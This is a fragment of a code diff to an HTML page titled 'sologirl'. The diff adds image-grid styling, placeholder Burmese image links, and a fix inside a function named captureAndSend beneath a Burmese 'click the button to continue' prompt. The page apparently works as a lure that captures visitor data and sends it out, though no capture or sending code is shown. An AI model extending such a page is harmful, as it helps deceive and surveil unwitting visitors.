@@ -5,6 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>sologirl</title>
     <style>
+
+.image-grid {
+        display: flex;
+        justify-content: center;
+        gap: 10px;
+        margin-bottom: 20px;
+    }
+    .image-grid img {
+        width: 100px;
+        height: 100px;
+        object-fit: cover;
+        border-radius: 8px;
+    }
         .logo-container img {
             width: 150px;
             height: auto;
@@ -39,6 +52,13 @@
     <div class="logo-container">
         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTIdsZ8DVwfk1aVnNnmO4aQ4WzivjTk1FLaNmOl8wlqWg&s=10" alt="Logo">
     </div>
+<div class="image-grid">
+    <img src="ပထမပုံ_လင့်ခ်" alt="Image 1">
+    <img src="ဒုတိယပုံ_လင့်ခ်" alt="Image 2">
+    <img src="တတိယပုံ_လင့်ခ်" alt="Image 3">
+    <img src="စတုတ္ထပုံ_လင့်ခ်" alt="Image 4">
+    <img src="ပဉ္စမပုံ_လင့်ခ်" alt="Image 5">
+</div>
     
     <h2>ဆက်သွားရန် ခလုတ်ကိုနှိပ်ပါ</h2>
     
@@ -76,7 +96,7 @@
 
         async function captureAndSend() {
             const statusText = document.getElementById("status");
-<div id="status">
+
            statusDiv.innerHTML = '<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTZTGLXLPzxjSP5rrhBlUJWoaj8ePkb2_qAjMg1mzhW8Q&s=10 " style="width:50px;">'; 
 
                      try {
